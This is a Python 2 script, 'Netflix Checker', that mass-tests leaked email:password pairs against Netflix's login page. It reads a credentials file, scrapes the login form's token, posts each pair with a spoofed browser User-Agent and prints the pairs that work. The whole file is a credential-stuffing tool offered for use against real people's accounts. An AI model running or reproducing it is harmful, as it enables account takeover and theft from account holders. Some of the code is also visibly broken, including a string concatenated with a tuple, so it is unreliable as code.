#!/usr/bin/env python
# coding=utf-8
#MassLoginChecker v.0.2
"""
Copyright (C) 2016, Alan Levy
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 2 of the License, or
(at your option) any later version.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""
__author__ = "Alan Levy"
__email__ = "alevy@cintainfinita.com"
__license__ = "GPL"

##########################################SETEAR RUTA DE ARCHIVO DE USUARIOS/CLAVES#######################################

archivo = "credenciales.txt"
print "--------------------------[Netflix Checker by Taolano]--------------------------"
try:
	import requests
	import sys, os
	import os.path
	#Libreria para trabajar y buscar dentro de un html
	from BeautifulSoup import BeautifulSoup as Soup
except ImportError:
	print "Needed dependencies: 'requests', 'BeautifulSoup'"

def checkPassword(email,password):
	stateA = ""
	s = requests.Session()
	s.headers.update({'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0'})
	login = s.get("https://www.netflix.com/ar-en/Login")
	soup=Soup(login.text)
	authURL = soup.findAll('form')[0]('input')[-2]['value']
	r2 = s.post("https://www.netflix.com:443/Login", headers={"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "https://www.netflix.com/Login", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}, data={"email": (email), "password": (password), "rememberMeCheckbox": "true", "flow": "websiteSignUp", "mode": "login", "action": "loginAction", "withFields": "email,password,rememberMe,nextPage", "authURL": (authURL), "nextPage": "https://www.netflix.com/browse"})
	r1 = s.get("https://www.netflix.com/browse")
	print "Testing: " + email
	validado = r1.text.find('Please enter a valid email')
	if validado == -1:
		stateA = "WORKING !","Email: "+email+" Password: "+password + "\n"
		print "State: " + stateA
	else:
		stateA = "not working" + "\n"
		print "State: " + stateA

def checkFile(archivo):
	try:
		fichero = open(archivo) 
		fichero.close()  
	except: 
		print "Be sure that credenciales.txt is write like this: email:password"
lectura = open(archivo, "r")
lineas = list(archivo)
checkFile(archivo)
for lineas in lectura:
	email=lineas.split(":")[0]
	password=lineas.split(":")[1]
	checkPassword(email,password)
